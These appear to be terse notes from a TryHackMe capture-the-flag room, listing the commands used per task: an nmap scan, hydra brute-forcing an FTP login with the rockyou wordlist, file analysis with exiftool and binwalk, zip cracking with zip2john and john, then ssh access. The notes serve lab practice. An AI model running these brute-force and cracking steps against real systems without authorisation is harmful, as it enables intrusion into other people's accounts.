
### TryHackMe Attackbox Used
## Task 2
### Commands Used: 
    nmap -sC -sV 10.10.139.170
### Programs Used:
   Burp Community Suite

## Task 3
### Commands Used:
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<target ip>  
    
(in ftp) mget *  

exiftool cutie.png  

xxd cutie.png  

binwalk cutie.png  

zip2john 8702.zip > hash.txt

john hash.txt

## Task 4
### Commands Used:
ssh james@<target ip>

sudo scp james@<target ip>:Alien_autospy.jpg ~/





  
  
